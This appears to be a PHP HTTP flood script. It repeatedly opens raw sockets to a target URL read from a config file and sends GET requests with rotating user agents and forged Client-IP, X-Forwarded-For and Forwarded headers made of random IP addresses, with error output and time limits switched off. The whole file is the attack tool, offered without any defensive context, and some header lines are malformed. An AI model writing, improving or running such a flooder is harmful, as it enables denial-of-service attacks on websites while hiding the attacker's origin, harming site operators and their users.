<?php
@set_time_limit(0);
@error_reporting(0);
include 'conf.php';
 for($i=1;$i<$max;$i++){

echo "[./Done ] $url<br>";
$matches = parse_url($url);
$host = $matches['host'];
$link = (isset($matches['path'])?$matches['path']:'/').(isset($matches['query'])?'?'.$matches['query']:'').(isset($matches['fragment'])?'#'.$matches['fragment']:'');
$port = !empty($matches['port'])?$matches['port'] : 80;
$usa = 'window 7.1|window 10|Opera mini|UC browser|Chrome|Googlebot|Facebook|Bing|Nokia|SAMSUNG|IoS|LGD';
$check=explode('|',$usa);
$r=rand(0,11);
$useragent=$check[$r];
for($i=0; $i<5; $i++){

$fp=@fsockopen($host,$port,$errno,$errval,3600);
if(!$fp){
echo "Failed ";
}else{
$rand_ip = rand(1,255).".".rand(1,255).".".rand(1,255).".".rand(1,255);
$out = "GET $link HTTP/1.1\r\n".
"Host: $host\r\n".
"Referer: $host".

"Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n";
$out .= "User-Agent: $useragent";
$out.="Client-IP: ".$rand_ip."\r\n";
$out .= "X-Forwarded-For:$rand_ip\r\n".
"Forwarded: $rand_ip\r\n".
"Via: CB-Prx\r\n".
"Connection: Close\r\n\r\n";

fwrite($fp,$out);
fclose($fp);

}
}
}